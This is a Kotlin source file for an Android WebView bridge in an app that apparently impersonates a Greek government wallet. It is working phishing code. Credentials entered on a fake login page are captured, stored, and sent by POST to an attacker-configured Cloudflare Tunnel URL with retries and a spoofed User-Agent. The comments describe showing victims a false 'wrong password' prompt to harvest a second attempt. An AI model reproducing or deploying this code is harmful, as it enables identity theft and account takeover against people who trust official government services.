package com.example.govgrwallet.web

import android.webkit.JavascriptInterface
import android.util.Log
import com.example.govgrwallet.BuildConfig
import com.example.govgrwallet.data.CapturedCredential
import com.example.govgrwallet.data.CredentialRepository
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class WebAppInterface(private val onCapture: () -> Unit) {

    // ⚠️ Set your Cloudflare Tunnel URL here (stable, no recompile needed if using BuildConfig)
    // Format: "https://your-tunnel-name.trycloudflare.com"
    private val exfilUrl = BuildConfig.EXFIL_URL.trim()

    @JavascriptInterface
    fun captureCredentials(user: String, pass: String) {
        Log.d("CAPTURE", "Captured: $user")
        CredentialRepository.add(CapturedCredential(username = user, password = pass))
        thread { exfiltrate(user, pass, retries = 3) }
        // Screen stays open — victim sees "wrong password" and retries
    }

    @JavascriptInterface
    fun finishSession() {
        // Called after second attempt — closes the portal
        onCapture()
    }

    private fun exfiltrate(user: String, pass: String, retries: Int) {
        val payload = """{"username":"$user","password":"$pass"}""".toByteArray(Charsets.UTF_8)

        repeat(retries) { attempt ->
            var connection: HttpURLConnection? = null
            try {
                connection = (URL(exfilUrl).openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    connectTimeout = 8000
                    readTimeout = 8000
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                }
                connection.outputStream.use { it.write(payload) }
                val code = connection.responseCode
                Log.d("EXFIL", "Response $code on attempt ${attempt + 1}")
                if (code in 200..299) return  // success — stop retrying
            } catch (e: Exception) {
                Log.e("EXFIL", "Attempt ${attempt + 1} failed: ${e.message}")
                if (attempt < retries - 1) Thread.sleep(2000)
            } finally {
                connection?.disconnect()
            }
        }
    }
}
